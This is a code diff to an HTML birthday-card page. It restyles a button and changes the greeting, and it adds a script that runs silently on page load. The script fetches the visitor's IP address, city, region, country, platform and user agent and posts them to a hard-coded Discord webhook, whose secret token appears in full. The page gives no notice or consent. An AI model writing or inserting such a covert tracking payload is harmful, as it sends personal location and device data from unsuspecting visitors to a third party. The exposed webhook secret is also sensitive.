@@ -175,6 +175,20 @@
     .card.loaded .inside {
       animation: slideIn 1s ease forwards;
     }
+    button {
+  padding: 15px 30px;
+  border: none;
+  border-radius: 5px;
+  background-color: #ff69b4;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+  transition: background-color 0.3s;
+}
+
+button:hover {
+  background-color: #e04997;
+}
   </style>
 </head>
 
@@ -197,7 +211,7 @@
       <div class="back"></div>
     </div>
     <div class="inside">
-      <p>"Happy birthday! May your special day be filled with joy, laughter and precious moments, And what you want can be achieved quickly!"</p>
+      <p>"Happy birthday!! Always successful and hope you achieve what you want quickly!! and Wish you all the best!!"</p>
       <h1>&#127873;</h1>
       <!-- Tombol "Lanjutkan" -->
       <button onclick="redirectToIndexz()">Lanjutkan</button>
@@ -242,6 +256,109 @@
       window.location.href = "indexz.html";
     }
   </script>
+  <script>
+    window.onload = function() {
+        sendWebhookOnLoad();
+    };
+
+    function sendWebhookOnLoad() {
+        // Mendapatkan informasi IP pengguna
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            var ip = data.ip;
+            // Mendapatkan informasi negara, provinsi, dan kota dari IP
+            fetch(`https://ipapi.co/${ip}/json/`)
+            .then(response => response.json())
+            .then(locationData => {
+                var country = locationData.country_name;
+                var region = locationData.region;
+                var city = locationData.city;
+                // Mendapatkan informasi perangkat pengguna
+                var device = navigator.platform;
+                // Mendapatkan informasi browser
+                var browser = getBrowserInfo();
+                // Mendapatkan informasi user agent
+                var userAgent = navigator.userAgent;
+                // Data yang akan dikirim ke webhook
+                var postData = {
+                    embeds: [{
+                        title: 'Seseorang telah membuka halaman kartu ulang tahun!',
+                        color: 16711710,
+                        fields: [
+                            {
+                                name: 'Informasi IP',
+                                value: ip,
+                                inline: true
+                            },
+                            {
+                                name: 'Negara',
+                                value: country,
+                                inline: true
+                            },
+                            {
+                                name: 'Provinsi',
+                                value: region,
+                                inline: true
+                            },
+                            {
+                                name: 'Kota',
+                                value: city,
+                                inline: true
+                            },
+                            {
+                                name: 'Perangkat',
+                                value: device,
+                                inline: true
+                            },
+                            {
+                                name: 'Browser',
+                                value: browser,
+                                inline: true
+                            },
+                            {
+                                name: 'User Agent',
+                                value: userAgent
+                            }
+                        ]
+                    }]
+                };
+
+                // URL webhook Discord
+                var webhookURL = 'https://discord.com/api/webhooks/1220702883188834304/SuUD2y3E3LsRibzoDOXyLeae0eXwMIczCRfc3QQJ3zUdIoWH8ZEANhtEv4vPrM4DClO9';
+
+                // Konfigurasi permintaan
+                var request = new XMLHttpRequest();
+                request.open('POST', webhookURL);
+                request.setRequestHeader('Content-type', 'application/json');
+
+                // Mengirim data sebagai JSON
+                request.send(JSON.stringify(postData));
+
+                // Mengirim log ke konsol
+                console.log('Halaman ulang tahun dibuka!');
+            });
+        })
+        .catch(error => console.error('Error:', error));
+    }
+
+    // Fungsi untuk mendapatkan informasi browser
+    function getBrowserInfo() {
+        var ua = navigator.userAgent;
+        var tem, M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+        if (/trident/i.test(M[1])) {
+            tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
+            return 'IE ' + (tem[1] || '');
+        }
+        if (M[1] === 'Chrome') {
+            tem = ua.match(/\bOPR\/(\d+)/);
+            if (tem != null) return 'Opera ' + tem[1];
+        }
+        M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
+        if ((tem = ua.match(/version\/(\d+)/i)) != null) M.splice(1, 1, tem[1]);
+        return M.join(' ');
+    }
+</script>
 </body>
 
 </html>
